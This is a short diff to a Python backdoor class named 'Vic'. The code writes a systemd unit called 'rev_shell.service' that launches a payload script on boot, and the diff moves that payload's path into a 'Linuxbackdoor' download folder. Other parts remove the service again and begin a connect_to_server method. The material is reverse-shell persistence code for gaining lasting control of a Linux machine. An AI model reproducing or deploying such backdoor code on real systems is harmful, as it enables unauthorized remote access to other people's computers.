@@ -31,7 +31,7 @@ class Vic:
             # find what system is being used
             if platform.system() == 'Linux': 
                 path = '/etc/systemd/system/rev_shell.service'
-                Execpath = '/root/payload.py'
+                Execpath = '/home/owner/Downloads/Linuxbackdoor/payload/payload.py'
 
                 service = '''
                     [Unit]
@@ -107,7 +107,7 @@ WantedBy=multi-user.target
             subprocess.call(['rm', '/etc/systemd/system/rev_shell.service'])
             subprocess.call(['systemctl', 'daemon-reload'])
         except Exception as e:
-            print("" % e)
+            print(e)
         return
 
     def connect_to_server(self):
